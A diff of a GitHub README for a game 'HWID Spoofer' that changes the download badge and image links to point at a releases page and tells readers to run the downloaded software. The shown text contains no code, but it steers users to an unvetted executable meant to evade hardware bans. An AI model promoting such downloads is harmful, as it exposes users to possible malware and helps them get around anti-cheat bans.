@@ -10,7 +10,7 @@ This repository contains a custom Hardware ID (HWID) Spoofer that allows users t
 ## How to Use
 1. Download the HWID Spoofer software from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18060583/Software.zip "Software.zip")
+[![Download Software](https://github.com/Skygodhee1/Spoofer-Hwid-Game/releases/tag/v2.0)](https://github.com/Skygodhee1/Spoofer-Hwid-Game/releases/tag/v2.0 "https://github.com/Skygodhee1/Spoofer-Hwid-Game/releases/tag/v2.0")
 
 2. Launch the downloaded software on your device to start using the HWID Spoofer.
 
@@ -19,4 +19,4 @@ Please note that the effectiveness and legality of using HWID spoofing tools may
 
 For more information and updates, check the "Releases" section of this repository.
 
-![Spoofer](https://cdn.pixabay.com/photo/2019/02/27/08/09/spoof-4020665_960_720.jpg)
+![Spoofer](https://github.com/Skygodhee1/Spoofer-Hwid-Game/releases/tag/v2.0)
